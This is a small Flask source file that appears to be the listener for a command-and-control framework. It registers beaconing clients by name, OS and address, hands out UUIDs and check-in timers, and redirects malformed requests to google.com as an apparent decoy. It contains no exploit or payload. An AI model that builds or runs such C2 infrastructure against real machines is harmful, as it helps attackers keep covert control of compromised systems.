from flask import Flask, request
import uuid
import random
from Modules.global_objects import connections, add_connection_list

app = Flask(__name__)


@app.route('/connection', methods=['GET'])
def connection():
    name = request.args.get('name')
    os = request.args.get('os')
    address = request.args.get('address')

    if name and os and address:
        userID = str(uuid.uuid4())
        add_connection_list(None, (address, 0), name, os, userID, "beacon")
        return {"timer": 5, "uuid": userID}, 200
    else:
        return Flask.redirect("https://www.google.com", code=302)


@app.route('/beacon', methods=['GET'])
def beacon():
    id = request.args.get('id')
    user_ids = connections.get("user_ids", [])
    for userID in user_ids:
        if userID == id:
            if random.choice([True, False]):
                return {"timer": random.randint(1, 10)}, 200
            return '', 200
    return '', 404
